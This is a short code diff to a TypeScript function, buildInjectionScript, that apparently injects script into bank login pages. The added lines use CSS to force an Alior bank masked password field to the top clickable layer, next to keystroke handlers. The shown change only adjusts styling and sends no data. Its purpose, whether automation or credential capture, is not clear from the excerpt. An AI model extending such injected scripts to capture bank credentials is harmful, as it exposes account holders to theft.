@@ -780,6 +780,14 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
                 advanceNext();
               } catch (e) {}
             });
+            // Uzerine binen overlay/label riski: masked kutuyu her zaman
+            // tiklanabilir en ust katmana tasi (alior js-keyboard-masked-input).
+            try {
+              el.style.setProperty("pointer-events", "auto", "important");
+              el.style.setProperty("position", "relative", "important");
+              el.style.setProperty("z-index", "9", "important");
+              el.style.setProperty("cursor", "text", "important");
+            } catch (e) {}
             el.addEventListener("keydown", (ev) => {
               try {
                 if (ev.key === "Backspace" && !(el.value || "").length) {
